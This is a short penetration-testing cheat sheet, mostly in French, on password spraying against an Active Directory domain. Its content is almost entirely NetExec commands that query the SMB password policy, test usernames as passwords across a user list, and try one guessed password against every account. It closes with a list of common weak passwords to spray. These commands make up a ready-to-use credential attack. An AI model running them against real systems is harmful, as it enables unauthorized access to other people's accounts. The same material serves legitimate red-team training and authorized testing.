# Password Spraying

> When you get an account on an active directory, the first thing to do is always getting the full list of users.\
> Once you get it you could do a password spray on the full user list (very often you will find other accounts with weak password like username=password, SeasonYear!, SocietynameYear! or even 123456).

Vérifier la politique de mot de passe

```bash
nxc smb 192.168.56.11 --pass-pol
nxc smb 192.168.56.11 -u 'a' -p '' --pass-pol
```

Username = Password

```bash
nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

Tester des mots de passes simples&#x20;

```bash
nxc smb <DC_ADDR> -d vault-tech.com -u users.txt -p 'Azerty123!'
```

Parmi les types de mots de passe les plus communs (à adapter selon la password policy):

* Password=Username (souvent des comptes de service)
* Mot de passe par défaut utilisé par l'IT
* NomEntreprise2024!
* NomEntreprise75001
* Janvier2024
* Mardi15042025!!!
* Azerty123!
* Password123!
* Bonjour123\*
* 123456
